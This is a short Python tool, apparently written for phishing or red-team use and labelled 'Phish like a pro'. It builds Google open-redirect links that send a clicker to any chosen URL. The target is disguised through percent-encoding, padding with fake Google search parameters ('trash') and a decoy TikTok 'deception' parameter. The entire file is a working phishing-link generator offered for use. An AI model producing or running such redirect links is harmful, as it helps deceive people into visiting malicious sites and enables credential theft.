import argparse

# Reset
Color_Off='\033[0m'       # Text Reset
Green='\033[0;32m'        # Green

banner = f"""
{Green}                                                         /$$ /$$                                 /$$                           
                                                        | $$|__/                                | $$                           
  /$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$$ /$$  /$$$$$$   /$$$$$$   /$$$$$$$ /$$$$$$       /$$$$$$  /$$   /$$
 /$$__  $$ /$$__  $$| $$__  $$ /$$__  $$ /$$__  $$ /$$__  $$| $$ /$$__  $$ /$$__  $$ /$$_____/|_  $$_/      /$$__  $$| $$  | $$
| $$  \\ $$| $$  \\ $$| $$  \\ $$| $$  \\__/| $$$$$$$$| $$  | $$| $$| $$  \\__/| $$$$$$$$| $$        | $$       | $$  \\ $$| $$  | $$
| $$  | $$| $$  | $$| $$  | $$| $$      | $$_____/| $$  | $$| $$| $$      | $$_____/| $$        | $$ /$$   | $$  | $$| $$  | $$
|  $$$$$$/| $$$$$$$/| $$  | $$| $$      |  $$$$$$$|  $$$$$$$| $$| $$      |  $$$$$$$|  $$$$$$$  |  $$$$//$$| $$$$$$$/|  $$$$$$$
 \\______/ | $$____/ |__/  |__/|__/       \\_______/ \\_______/|__/|__/       \\_______/ \\_______/   \\___/ |__/| $$____/  \\____  $$
          | $$                                                                                             | $$       /$$  | $$
          | $$                                                                                             | $$      |  $$$$$$/
          |__/                                                                                             |__/       \\______/ 
{Color_Off}
                                                                                                            Krystian Bajno 2024
"""


def percent_double_urlencode_ascii(s):
    return ''.join(['%{:02X}'.format(ord(c)) for c in s])

def generate_redirect(url, deception, trash):
    target = percent_double_urlencode_ascii(url)
    q = percent_double_urlencode_ascii("https://google.com/amp/s/")
    redir = f"https://google.com/url?{trash}&q={q}{target}{deception}"
    print(redir)


def main():
    print(banner)
    parser = argparse.ArgumentParser("opnredirect.py", description="Phish like a pro")
    parser.add_argument("url", help="URL to redirect", type=str)
    deception = "&search=tiktok.com/@predictable/video/7384779117729713441&action=play" # deception
    trash = "&sca_esv=f4442ecd5deaf30f&ei=xyz0eW91ZG93bm5ldmVyZ29ubmE&ved=bmV2ZXIgZ29ubmEgZ2l2ZSB5b3UgdXAK&uact=6&oq=search&gs_lp=RWdibmQzTXRkMm6c0FNWTFnUVlSemJHVjBlVzkxWkc5M2JtRnliM1Z1UFZZ0FRWXNBTVlReGlLQlVqWVdWQUFXQUJ3QTNnQmtBRUFtQUVBb0FFQXFnRUF1QUVEeUFFQW1BSURvQUlobUFNQWlBWUJrQVlLa2djQk02QUhBQQ&sclient=gws-wiz-serp"

    parser.add_argument("--deception", action='store',  help='Override deception URL.')
    parser.add_argument("--trash", action='store', required=False, help='Override trash.')

    args = parser.parse_args()
    
    if args.deception:
        print(args.deception)
        deception = args.deception 
            
    if args.trash: 
        trash = args.trash  
        
    generate_redirect(args.url, deception, trash)

if __name__ == "__main__":
    main() 